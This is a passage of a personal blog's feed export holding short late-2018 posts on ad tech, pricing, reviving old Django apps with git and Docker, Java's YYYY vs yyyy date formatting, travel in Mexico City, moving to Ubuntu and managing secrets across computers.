<p>Maybe they have enough data to indicate that these sorts of scenes hook people and actually lead to higher engagement but this still feels wrong. Maybe I’m just a curmudgeon and non else cares but this seems like a case of a run-away AI that may be optimizing for the more immediate, but wrong thing.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>A personal DSP</title>
   <link href="http://dangoldin.com/2019/02/09/a-personal-dsp/"/>
   <updated>2019-02-09T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2019/02/09/a-personal-dsp</id>
   <content:encoded><![CDATA[
<p>A common refrain from people who use adblock is that they’d be willing to pay for the content if it were an option and only use adblock to avoid the tracking and slow site speed. The desire is to have a way to see how much a website is generating from their visit and give the publisher that money directly. That way the publisher gets the equivalent amount of money as they would otherwise and the user gets to avoid ads.</p>

<p>There’s no solution that’s capable of doing that right now but it’s interesting to think about a solution that could make that possible. My proposal is a personal <a href="https://en.wikipedia.org/wiki/Demand-side_platform">DSP</a> (Demand-side platform): the idea is that it’s a “bidder” that acts just like any other company participating in real time bidding but instead of trying to optimize towards a specific campaign all it does is bid whenever a single user is identified - you. And when it does bid it bids an absurdly high amount in order to win every single time.</p>

<p>The technology for this already exists but you’d need to somehow get this DSP integrated into every single <a href="https://en.wikipedia.org/wiki/Supply-side_platform">SSP</a> (Supply-side platform) in order to have access to every single ad request. And then you’d need to have the ability to process hundreds of billions of ad requests a day and discard nearly all of them. In addition, you’d need to find a way to sync your user information with every information so you’d be able to identify yourself in their requests. It’s all technically doable but extremely difficult in practice.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Finally, some price increases</title>
   <link href="http://dangoldin.com/2019/02/02/finally-some-price-increases/"/>
   <updated>2019-02-02T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2019/02/02/finally-some-price-increases</id>
   <content:encoded><![CDATA[
<p>For as long as I can remember it felt that there was this hidden rule that companies cannot raise prices or risk mass customer abandonment. Yet the past few few months we’ve seen two major companies increase prices - <a href="https://www.isostech.com/blogs/atlassian/price-increase-sandwich/">Atlassian</a> and <a href="https://bgr.com/2019/01/15/netflix-price-increase-2019-standard-basic-premium/">Netflix</a> - without any adverse effects. The products are improving and are offering more functionality so it’s only fair that the prices increase. This is a welcome sign and I hope it leads to companies starting to invest significantly more in improving their existing products with the expectation that they’ll be able to raise prices in line with the additional value they’re bringing. Imagine what sort of investments companies would be making if they knew they’d be able to raise the price of their products.</p>

<p>Modern digital products have moved beyond release versions and are constantly being released and deployed. This makes increasing prices difficult. In the past you’d be able to say that the new version comes with XYZ new features but you need to pay. These days feature improvements are released as soon as they’re developed and we get so used to the continuous improvements that we no longer have the concept of the “old version.” This makes pricing difficult since it feels as if we’re paying more without getting anything in return. Yet when we’re confronted with the price increase and have to decide whether this new price is worth what we’re getting we inevitably say yes. That’s the bet Atlassian and Netflix are taking and I’m optimistic this leads to a slew of new products.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Modernizing Makers Alley and Better404</title>
   <link href="http://dangoldin.com/2019/01/27/modernizing-makers-alley-and-better404/"/>
   <updated>2019-01-27T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2019/01/27/modernizing-makers-alley-and-better404</id>
   <content:encoded><![CDATA[
<p>Years ago I started two companies, <a href="http://makersalley.com">Makers Alley</a> and <a href="https://better404.com">Better404</a>, and while they were both failures I didn’t have the heart to shut down the site. I put a lot of heart into building them and just pulling the plug felt cold. Instead I just paid the annual hosting fee and had them both running on a small AWS instance. This worked fine for years but unfortunately while I was messing around with Terraform I ended up terminating the instance entirely. Beyond the fact that they were both running incredibly old libraries with no available pip libraries the instance also contained the only copy of the database. I wa stuck with having the source code from a few years ago and not much else. Rather than give up I decided to use this as an opportunity to learn a bit and modernize them using some of the newer technologies.</p>

<p>The one saving grace was that for both repos I found an old commit containing a database dump so I didn’t have to start from scratch. It took me a bit of time to find them but I discovered a set of git commands to find the deleted file and the associated commit which allowed me to retrieve the file.</p>

<figure class="highlight"><pre><code class="language-sh" data-lang="sh">git log <span class="nt">--diff-filter</span><span class="o">=</span>D <span class="nt">--summary</span> | <span class="nb">grep </span>delete | <span class="nb">grep </span>dump.tgz
git log <span class="nt">--oneline</span> <span class="nt">--follow</span> <span class="nt">--</span> dump.tgz</code></pre></figure>

<p>Getting the data back took care of a big problem and the rest was making sure that the applications actually ran. They were both created using old versions of Django - 1.4 for Makers Alley and 1.5 for Better404. Remarkably, everything in the Better404 requirements.txt file installed properly and I was able to both cleanup the config files and get everything working using Docker and docker-compose in a single evening session. Makers Alley, on the other hand, proved more difficult. Many of the dependencies in the requirements.txt file refused to install and I got stuck in a loop of library upgrades where upgrading one library required an upgrade to another library. At some point I just gave up and upgraded everything to the latest version and did a scrubbing session where I just stripped away all unused functionality in order to reduce the amount of dependencies. One of the biggest changes was upgrading Makers Alley to support Elasticsearch 6.5 from 1.9 - there were so many breaking changes that I had to go through the code and update the way indexing and search was implemented since the old libraries had no support for the latest version of Elasticsearch. Fixing Makers Alley took a holiday weekend to get right but I’m happy with the overall result - it’s now running on Django 1.11 and every library is at the latest version.</p>

<p>The entire process was fun and both made me appreciate how much easier it is do develop using Docker. At the same time, it’s a reminder of how difficult and frustrating dependency management can be. Had I been actively developing the apps I would have made an effort to constantly be upgrading the libraries and resolving issues as they came up rather than doing a large scale cleanup with 5 years worth of package upgrades.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Buying Kindle books on iOS</title>
   <link href="http://dangoldin.com/2019/01/12/buying-kindle-books-on-ios/"/>
   <updated>2019-01-12T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2019/01/12/buying-kindle-books-on-ios</id>
   <content:encoded><![CDATA[
<p>Earlier this week I finished an ebook on the train and wanted to purchase another one for the way back while waiting in the station. Remarkably, Apple, a company that emphasizes and takes pride in its user experience, does not make this easy. It turns out that the Kindle app on iOS does not allow you to actually purchase a book and isn’t even allowed to link to a page where it can be purchased. I understand the business rationale - Apple wants the 30% of the digital sale and Amazon doesn’t want to give it up - but it leads to an awful experience, especially when only the station has service and I know I will be signalless once I board the train.</p>

<p>To be fair the entire experience felt like a race against time: can I buy the book before the train arrives? After realizing I couldn’t use the Kindle app I gave up and just went to Amazon’s mobile site. I found the book pretty easily but then had to go through the signin flow. To make things interesting Amazon decided to through a confusing captcha my way that required two attempts to get right - requiring retyping password for the second attempt. Thankfully the “Buy with 1 click” button saved the day and I was able to purchase and download the book by the time the train arrived.</p>

<p>As enjoyable as the rush was it’s a terrible experience on all sides. I understand that Apple owns the entire ecosystem and wants its share of the profit but they’re really not adding much to the experience. Amazon is what’s driving my purchase and they already have my payment info stored. There’s no reason for Apple to be involved here other than to prioritize greed over user experience. I hope they change their mindset but am not optimistic.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>GitHub's new plan</title>
   <link href="http://dangoldin.com/2019/01/08/githubs-new-plan/"/>
   <updated>2019-01-08T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2019/01/08/githubs-new-plan</id>
   <content:encoded><![CDATA[
<p>Earlier today GitHub announced that they would make a significant change to their plans: a free plan would now be able to have private repos. I’m likely one of the many GitHub users who host their personal projects on GitHub with many being private. Some of these are projects I’m just not ready to release while others are proprietary scripts or private DevOps code. I was on the $7/mo Pro plan and downgraded to the free plan. I lost the advanced collaboration tools which I wasn’t using for my personal projects in the first place and it feels good to be $7 richer each month.</p>

<p>I think this is an intelligent move on GitHub’s part. While they probably have tons of engineers paying the $7 for the Pro plan they’re likely making the vast majority of their revenue off of companies that are paying hundreds and thousands of dollars each month and would rather be thought of as the leader in git hosting. This allows them to hook new developers early and discourage them from leaving GitHub to another service as they grow in their careers.</p>

<p>It’s always impressive when companies are able to sacrifice the short term in favor of the long term. It’s not easy to make the case that a company should sacrifice the money it’s making now for a potential payoff later and it’s great that GitHub made the choice. It’s impossible to predict the outcome but I’m optimistic that this was the right call for them - they’re already the market leader and this makes it that much harder for others to compete.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Java's SimpleDateFormat: YYYY vs yyyy</title>
   <link href="http://dangoldin.com/2019/01/06/javas-simpledateformat-yyyy-vs-yyyy/"/>
   <updated>2019-01-06T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2019/01/06/javas-simpledateformat-yyyy-vs-yyyy</id>
   <content:encoded><![CDATA[
<p>This post would have been more appropriate a week ago when 2018 was coming to a close but better late than never. This is a friendly reminder that when formatting dates in Java’s SimpleDateFormat class there is a subtle difference between YYYY and yyyy. They both represent a year but yyyy represents the calendar year while YYYY represents the year of the week. That’s a subtle difference that only causes problems around a year change so your code could have been running perfectly fine all year only to cause a problem in the new year.</p>

<p>An example illustrates this much better than words ever could.</p>

<figure class="highlight"><pre><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">com.dangoldin.test</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">java.text.SimpleDateFormat</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.Date</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Test</span> <span class="o">{</span>

    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="nc">String</span><span class="o">[]</span> <span class="n">dates</span> <span class="o">=</span> <span class="o">{</span><span class="s">"2018-12-01"</span><span class="o">,</span> <span class="s">"2018-12-31"</span><span class="o">,</span> <span class="s">"2019-01-01"</span><span class="o">};</span>
            <span class="k">for</span> <span class="o">(</span><span class="nc">String</span> <span class="nl">date:</span> <span class="n">dates</span><span class="o">)</span> <span class="o">{</span>
                <span class="nc">SimpleDateFormat</span> <span class="n">dt</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">SimpleDateFormat</span><span class="o">(</span><span class="s">"yyyy-MM-dd"</span><span class="o">);</span>
                <span class="nc">Date</span> <span class="n">d</span> <span class="o">=</span> <span class="n">dt</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="n">date</span><span class="o">);</span>

                <span class="nc">SimpleDateFormat</span> <span class="n">dtYYYY</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">SimpleDateFormat</span><span class="o">(</span><span class="s">"YYYY"</span><span class="o">);</span>
                <span class="nc">SimpleDateFormat</span> <span class="n">dtyyyy</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">SimpleDateFormat</span><span class="o">(</span><span class="s">"yyyy"</span><span class="o">);</span>

                <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"For date "</span> <span class="o">+</span> <span class="n">date</span> <span class="o">+</span> <span class="s">" the YYYY year is "</span> <span class="o">+</span> <span class="n">dtYYYY</span><span class="o">.</span><span class="na">format</span><span class="o">(</span><span class="n">d</span><span class="o">)</span> <span class="o">+</span> <span class="s">" while for yyyy it's "</span> <span class="o">+</span> <span class="n">dtyyyy</span><span class="o">.</span><span class="na">format</span><span class="o">(</span><span class="n">d</span><span class="o">));</span>
            <span class="o">}</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
            <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Failed with exception: "</span> <span class="o">+</span> <span class="n">e</span><span class="o">);</span>
        <span class="o">}</span>
    <span class="o">}</span>
<span class="o">}</span></code></pre></figure>

<p>This gives you the following:</p>

<figure class="highlight"><pre><code class="language-txt" data-lang="txt">For date 2018-12-01 the YYYY year is 2018 while for yyyy it's 2018
For date 2018-12-31 the YYYY year is 2019 while for yyyy it's 2018
For date 2019-01-01 the YYYY year is 2019 while for yyyy it's 2019</code></pre></figure>

<p>The first and last make sense since the two year formats match. The middle one is the odd one out. The date starts as 2018-12-31 but YYYY gives you 2019 while yyyy gives you 2018. In general, you should almost always use yyyy so it’s a good tactic to add some form of linting or checking to make sure your code does not have any date formats referencing YYYY.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Farewell 2018, Hello 2019!</title>
   <link href="http://dangoldin.com/2018/12/31/farewell-2018-hello-2019/"/>
   <updated>2018-12-31T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2018/12/31/farewell-2018-hello-2019</id>
   <content:encoded><![CDATA[
<p>Despite falling behind significantly in my writing this past year I miraculously managed to achieve my target of 2 blog posts a week. It was not a fun time and definitely felt like a chore having to write multiple posts a day - including 3 yesterday and today - but I’m glad to have been able to achieve my target and keep the streak going. The length and depth of my blog posts has definitely declined over the past 2 months but it was refreshing being forced to write about whatever came to mind. I didn’t have the luxury to plan ahead and had to comb my immediate thoughts and short term memory for topics or fall back to a running list of ideas for inspiration. I wish I gave some of those topics more thought and plan on revisiting them for 2019.</p>

<p>So thank you all for sticking around and hope to achieve a much higher bar in 2019. I want to shift my focus on evergreen content instead of the much easier news reactions but that requires more effort and planning which I hope to invest in for 2019.</p>

<p>Happy New Year and see you all in 2019.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Dorm rooms for adults</title>
   <link href="http://dangoldin.com/2018/12/31/dorm-rooms-for-adults/"/>
   <updated>2018-12-31T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2018/12/31/dorm-rooms-for-adults</id>
   <content:encoded><![CDATA[
<p>Not to keep beating a dead horse but the housing situation in San Francisco seems ridiculous. Back in March, the NY Times <a href="https://www.nytimes.com/2018/03/04/technology/dorm-living-grown-ups-san-francisco.html">wrote an article</a> covering Starcity, a company that builds “dorms” for professionals. The article is positioned as a positive since it’s giving people an option to live in San Francisco who may not be able to afford a place to themselves but it just feels like as if the real world is mirroring the software world.</p>

<p>Cloud providers rent server space by the second and allow companies to avoid building their own data centers. The parallel to housing is that building your own data center is akin to owning a house while using a cloud provider is akin to renting. Taking this analogy further having one of these dorm rooms is equivalent to renting a Wordpress blog - you get a website but the functionality and freedom is restricted.</p>

<p>I don’t mean to come off as negative - this is actually solving a problem and it’s great that capitalism has come up with a solution; it’s just disappointing that we have this situation in the first place.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>2019 Predictions</title>
   <link href="http://dangoldin.com/2018/12/31/2019-predictions/"/>
   <updated>2018-12-31T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2018/12/31/2019-predictions</id>
   <content:encoded><![CDATA[
<p>What’s more fitting on the last day of the year than providing predictions for the next year? I’ve never done these before but like the idea - it’s a good way to force me to think about the coming year as well as keep me honest when looking back. Our minds and memories are incredible fallible so by putting it in public writing it’s much more difficult to refute.</p>

<p>And now onto my predictions:</p>

<ul>
  <li><strong>The overall economy takes a hit</strong>. We’ve already seen cracks and I expect them to take a bigger hit in 2019. Given the political and global climate it feels as if we’re walking on eggshells and it will only take a little crack to send things falling. The S&amp;P is currently at just over $2,500 but I expect at the end of the 2019 it will be down to below $2,200.</li>
  <li><strong>Facebook privacy concerns are overblown</strong>. As much as I hate to admit this I don’t expect much to happen to Facebook despite the coverage. I expect them to take a few positive steps to allay the concerns but the Facebook economic machine will continue going strong and will recover after the quarterly earning reports.</li>
  <li><strong>Amazon continues to dominate</strong>. Amazon has been moving further and further away from ecommerce and I expect them to make more meaningful moves in this direction. It may be another surprising acquisition but I’m bullish on Amazon making strong moves in 2019.</li>
  <li><strong>China vs US becomes a bigger deal</strong>. Given the existing climate this will only get worse and worse in 2019. I expect a growing trade war as both sides become more and more entrenched and refuse to settle their differences.</li>
</ul>

<p>I plan to put my money where my mouth is and invest in the first 3. The first two I will rely on options while for Amazon I will buy the stock.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Twenty seconds makes all the difference</title>
   <link href="http://dangoldin.com/2018/12/30/twenty-seconds-makes-all-the-difference/"/>
   <updated>2018-12-30T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2018/12/30/twenty-seconds-makes-all-the-difference</id>
   <content:encoded><![CDATA[
<p>I recently switched from a 2015 Macbook Pro to a new ThinkPad with Ubuntu and one of the most noticeable differences is how much faster this blog builds. A few years ago I moved this blog over to <a href="https://www.ampproject.org/">AMP</a> to improve its load times. I don’t want to go into the details of AMP but in order to get the performance wins all styling is inlined - that means that instead of linking to a CSS file the CSS rules are explicitly defined on each page. That means the build system is not simply generating an HTML page off of a template but also inlining the CSS rules onto every generated page.</p>

<p>The above was only meant to set the context and the primary point is that building this blog is not simple. On the Macbook the build process took close to 30 seconds but on the ThinkPad it’s almost always done within 8 seconds. While just over 20 seconds longer it’s almost 4 times as long and it makes all the difference. I find that I’m willing to just stay on the terminal and wait the 8 seconds for it to finish while if it’s over 20 seconds I decide to do something else in the meantime. Unfortunately, that break often ends up taking a few minutes before I go back and actually check the status.</p>

<p>It’s a bit sad that 20 seconds is enough to change my workflow but there’s a lesson here somewhere. These days there are so many distractions that unfortunately seconds do matter and it affects website behavior as much as desktop software. We’ve trained ourselves to be easily distracted that it’s something all product builders need to keep in mind.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Mexico city thoughts</title>
   <link href="http://dangoldin.com/2018/12/30/mexico-city-thoughts/"/>
   <updated>2018-12-30T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2018/12/30/mexico-city-thoughts</id>
   <content:encoded><![CDATA[
<p>While my vacation memories are still fresh I wanted to share some thoughts about Mexico City. It was my first time in both Mexico and Mexico City but it was a great city with a ton of things to do and very helpful people. We’re all products of our experience and can’t help but compare the places we visit against the places we live. New York City and Mexico City have a lot in common: they’re both large modern cities with robust infrastructure and all the modern “millennial amenities” including ride sharing, bike sharing, various food delivery services, and a ton of bars and restaurants. In fact Mexico City also has electric scooters which still haven’t made it into NYC.</p>

<p>The architecture of Mexico City was great and felt less sterile than that of NYC. Similar to NYC, each neighborhood has a different feel but it felt that there was a much wider range in architecture styles and expression. I was also surprised by how many parks there were. It felt that no matter where you were there was always at least one moderately sized park, and often more than one, a few blocks away. They were all clean and well maintained and it was great being able to be able to sit down and take a break after tons of walking.</p>

<p>The other major difference was price: nearly everything in Mexico City was more than twice as cheap as in NYC. This included food, transport, and housing. I couldn’t tell whether the traffic was worse in Mexico City but given the much cheaper Uber prices we ended up relying on it heavily.</p>

<p>The one concern that stood out was the air quality. Mexico City is over 7000 feet above sea level so I didn’t expect the level of smog we encountered. Our trip was short so it didn’t have a significant impact but it would be a concern for longer-term living.</p>

<p>All in all I had a great time and definitely recommend it. The city is great with wonderful people, affordable and delicious food, and less than a 6 hour flight from NYC.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Amazon vs Walmart</title>
   <link href="http://dangoldin.com/2018/12/30/amazon-vs-walmart/"/>
   <updated>2018-12-30T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2018/12/30/amazon-vs-walmart</id>
   <content:encoded><![CDATA[
<img src="http://dangoldin.com/assets/static/images/amazon-vs-walmart.png" alt="Amazon vs Walmart 1 year stock graph" width="651" height="706" layout="responsive"/>

<p>One of the most exciting business battles is Amazon vs Walmart and I’m interested in seeing what happens in 2019. As I’m writing this Amazon has a market cap of $723B while Walmart is at $268. At the same time, Amazon’s <a href="https://www.statista.com/statistics/266282/annual-net-revenue-of-amazoncom/">2017 revenue</a> was $178B while Walmart’s <a href="https://www.statista.com/statistics/555334/total-revenue-of-walmart-worldwide/">was</a> $486B. The market views them as two completely different businesses and that’s fair - Walmart is a traditional retailer while Amazon has its hands in a variety of businesses - ranging from retail, to a marketplace, to a cloud hosting provider. Walmart is still trying to figure out ecommerce: they acquired Jet.com in 2016 and this past year bought Flipkart. Amazon, on the other hand, seems to be playing a very different game. They acquired Whole Foods in 2017 and Ring the past year. In the first case Amazon is going deeper into traditional retail while the latter feels like an entry into the home. It looks as if Walmart is fighting yesterday’s battle while Amazon continues plowing ahead into the future. I don’t know how this will play out but I am an Amazon shareholder so can’t help but feel optimistic.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Wired headphones</title>
   <link href="http://dangoldin.com/2018/12/29/wired-headphones/"/>
   <updated>2018-12-29T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2018/12/29/wired-headphones</id>
   <content:encoded><![CDATA[
<p>I left my Bluetooth headphones at home this morning and ended up borrowing a wired pair during the day. I forgot how easy it is to just be able to plug in and go - no waiting for the headphones to turn on, no waiting for the Bluetooth to connect, and no having to deal with selecting the proper audio out channel. The convenience of Bluetooth outweighs the costs but it was a stark reminder of how much more robust and simpler tools used to be. To be indistinguishable from “magic” our products need to have a lot of magic inside them. Almost always the magic works but every once in a while we end up stuck. It seems to be the natural way of things. When cars were first created they were extremely mechanical and owners had the skillset and ability to fix them. Now they’re all digital and require a licensed mechanic. Computers are the same way - I grew up being able to do some quick repairs and replacements but good luck trying to replace components in modern computers or phones: it’s doable but not very enjoyable. There is a part of me that yearns for the simpler days but I’m realistic enough to know that I don’t really want to go back.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>The Teotihuacan pyramids</title>
   <link href="http://dangoldin.com/2018/12/29/the-teotihuacan-pyramids/"/>
   <updated>2018-12-29T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2018/12/29/the-teotihuacan-pyramids</id>
   <content:encoded><![CDATA[
<img src="http://dangoldin.com/assets/static/images//teotihuacan-pyramids.jpg" alt="The Teotihuacan pyramids" width="6127" height="2037" layout="responsive"/>

<p>Last week I was on vacation in Mexico City and did a day trip to <a href="https://en.wikipedia.org/wiki/Teotihuacan">Teotihuacan</a>, an ancient Mesoamerican city known for its pyramids. I find it inspiring being able to visit ruins from more than a thousand years ago. There’s something magical being able to set foot on a lost world with its own unique way of life that is impossible to recapture. So much time has passed between the actual living civilization and tourists exploring the ruins that it feels we’re completely different species and yet we’re still the same flesh, blood, and potential - just born at different times. It gives you some perspective knowing that what was once this huge civilization is now a tourist site.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Moving from OS X to Ubuntu</title>
   <link href="http://dangoldin.com/2018/12/29/moving-from-os-x-to-ubuntu/"/>
   <updated>2018-12-29T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2018/12/29/moving-from-os-x-to-ubuntu</id>
   <content:encoded><![CDATA[
<p>It gets easier and easier to set up a new computer. I took advantage of the Cyber Monday deals to get myself a ThinkPad that I immediately proceeded to switch over to Ubuntu. Before the cloud getting a new computer introduced a whole world of pain since you had to worry about migrating important files. These days it’s incredibly simple: most of our digital lives are replicated somewhere online and local files can be kept in Dropbox while code is kept on GitHub. I migrated from OS X to Ubuntu and the vast majority of the issues I’m running into are keyboard shortcut and workflow related and nothing to do with the software itself.</p>

<p>The only difficult parts of the migration were moving secrets and application configurations. I wrote about the <a href="/2018/12/26/secret-management-across-computers/">secret migration</a> but that only adds some usability friction. Similar with application configurations - I can always recreate my options but it’s much easier to just export the configuration from the old computer and load it into the new one. I’m approaching this on an on-demand basis as I use an application and so far have done my shell config files (with updated paths), Visual Studio Code, DataGrip, and IntelliJ. There are quite a few left but once I get used to the keyboard layout and the new shortcuts I’ll be as productive as ever.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Calendly</title>
   <link href="http://dangoldin.com/2018/12/28/calendly/"/>
   <updated>2018-12-28T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2018/12/28/calendly</id>
   <content:encoded><![CDATA[
<p>Over the years I’ve received a ton of <a href="https://calendly.com">Calendly</a> links - it’s an application that integrates with your calendar and hosts a personal page that allows others to book time on your calendar. As a user it’s great since it offloads scheduling responsibility from you to others. At the same time, I was was always bothered by the fact that that effort was externalized to me despite it actually being more efficient for both sides. In any case, I had a real need to actually use it in order to help an external recruiter find time on my calendar to conduct some phone screens and the onboarding process was extremely slick. It was as simple as authenticating with my Google account, granting a few permissions, and then receiving a public link that could be shared with others. I wish more products had as simple of an onboarding - you get the basic functionality with minimal effort yet have the option to customize it as you become comfortable with the product and your use case expands.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Eerie blue NYC sky</title>
   <link href="http://dangoldin.com/2018/12/27/eerie-blue-nyc-sky/"/>
   <updated>2018-12-27T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2018/12/27/eerie-blue-nyc-sky</id>
   <content:encoded><![CDATA[
<amp-youtube data-videoid="6G4dYRcKnVE" layout="responsive" width="640" height="480"></amp-youtube>

<p>Earlier tonight I looked out the window to notice an eerie blue-green sky over NYC. It looked like the standard alien landing in a scifi movie and was incredibly surreal. It turns out it was a <a href="https://www.nbcnewyork.com/news/local/Blue-Light-Sky-Explosion-Queens-503589291.html">transformer explosion</a> in Queens but for a second it really did feel as if something bizzare was happening. It makes you both appreciate and fear about the modern world - the technologies and cities we have are so complex and modern that an explosion led the night sky to glow blue for more than a minute. I didn’t even realize there was anything powerful enough to make the night sky glow that bright for that long but apparently we’re surrounded by that potential.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Amazon's "Add to list" design</title>
   <link href="http://dangoldin.com/2018/12/27/amazons-add-to-list-design/"/>
   <updated>2018-12-27T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2018/12/27/amazons-add-to-list-design</id>
   <content:encoded><![CDATA[
<p>I use Amazon’s wish list as a placeholder of books I plan on buying. I’m not sure why I don’t just buy them immediately but whenever I’m done with a book I go to my wish list and purchase a new one. Earlier today while adding two books to my wish list I noticed something odd: the location of the “Add to list” button was different from one page to the next. Amazon is the premier ecommerce company and must be doing a ton of A/B testing to optimize the design of the site so it’s surprising that the button is in two completely different locations. I was in the same browser session as well so it’s not as if they’re randomizing it per session; instead it’s as if they’re just showing me two completely different designs for two different products.</p>

<p>I’ve included the two screenshots below as proof but you might be able to reproduce it by comparing the pages of the two books: <a href="https://www.amazon.com/Airbnb-Story-Ordinary-Disrupted-Controversy/dp/0544952669">The Airbnb Story</a> and <a href="https://www.amazon.com/How-Internet-Happened-Netscape-iPhone-ebook-dp-B07BLJ1QYZ/dp/B07BLJ1QYZ/ref=mt_kindle?_encoding=UTF8&amp;me=&amp;qid=">How the Internet Happened</a>. Maybe I’m the rare user who actually uses the list functionality and it has minimal impact on the customer experience but I find it odd that there’s no consistent place for the “Add to list” button.</p>

<img src="http://dangoldin.com/assets/static/images/amazon-airbnb-story.png" alt="Amazon page for The Airbnb Story" width="3046" height="1332" layout="responsive"/>

<img src="http://dangoldin.com/assets/static/images/amazon-how-the-internet-happened.png" alt="Amazon page for How the Internet Happened" width="2570" height="1512" layout="responsive"/>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Secret management across computers</title>
   <link href="http://dangoldin.com/2018/12/26/secret-management-across-computers/"/>
   <updated>2018-12-26T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2018/12/26/secret-management-across-computers</id>
   <content:encoded><![CDATA[
<p>As part of the Cyber Monday nonsense I convinced myself to purchase a ThinkPad in order to run Linux. I have a separate post coming about the transition from OS X to Ubuntu but one area I’m still trying to get under control is secret management. I have a ton of code on the old computer and almost all of it is on GitHub. The biggest challenge so far has been migrating secrets across computers. For example I have a variety of scripts that talk to Slack or the Google ecosystem which require their own tokens and keys. Some are straightforward to reissue - for example AWS - while others require a fair amount of frustrated searching. I don’t have the answer here but have been thinking about the following approaches to make things easier and would love to know how others handle this.</p>

<ul>
  <li><strong>Just step it up and get the new secrets</strong>. For each project I have I can look at the configuration file and determine exactly what I need and then issue the appropriate credentials from the various services. I know this will work but just feels like a lot of grunt work and not very interesting.</li>
  <li><strong>Move all secrets to Dropbox</strong>. I can just move all the secrets to Dropbox so they automatically sync across my computers. It will work but will require me figuring out a naming convention and then rewrite a bunch of my scripts to allow for a explicitly named configuration file. The nice thing is that this will automatically update as I add or modify the existing credential files.</li>
  <li><strong>Encrypt and upload to GitHub</strong>. Rather than relying on Dropbox I can encrypt the secrets and store them in GitHub. I don’t like the fact that I’m actually uploading secrets to a public repo, even if they are encrypted - it just feels dangerous.</li>
  <li><strong>Keep all secrets to S3</strong>. Similar to the others but this feels more private than the others. I still don’t like the fact that I’d have to come up with a naming convention to keep things organized but this seems like a reasonable approach.</li>
  <li><strong>Host a personal copy of <a href="https://www.vaultproject.io">Vault</a> or an equivalent system</strong>. I messed around with Vault years ago and it’s a full featured application to improve secret management that comes with a role based system. This may be overkill for what I’m trying to do but I’m tempted since it will give me experience with something new and can serve as a foundation for future projects.</li>
</ul>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Visualizing my blog: 2018 edition</title>
   <link href="http://dangoldin.com/2018/12/26/analyzing-my-blog-2018-edition/"/>
   <updated>2018-12-26T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2018/12/26/analyzing-my-blog-2018-edition</id>
   <content:encoded><![CDATA[
<p>Last year I came up with a set of scripts to analyze my blog and thought it would be interesting to rerun them this year to see what’s changed. There are a ton of visualizations up on <a href="https://github.com/dangoldin/blog-analytics/tree/master/img/2018">GitHub</a> but most are just a fun visual without actually telling a story. I’ve included the most important ones below with a bit of analysis and commentary. It also looks as if the charts are getting too messy for multiple years of data so I’ll need to revisit the visualizations for 2019.</p>

<ul class="thumbnails">
  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/date_month-plot-count-2018.png" alt="Posts over time" width="2100" height="2100" layout="responsive"/>
      <p>You can clearly see how behind I am and how aggressive I've been over the past 2 months. Definitely do not want to repeat this in 2019.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/dow-date_year-plot2-2018.png" alt="Posts by day of week and year" width="2100" height="2100" layout="responsive"/>
      <p>Previous years indicate that I've primarily been writing on weekends but this year you see a nice even distribution across every day of the week. Unfortunately this is just a function of me trying to catch up and writing multiple posts a day.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
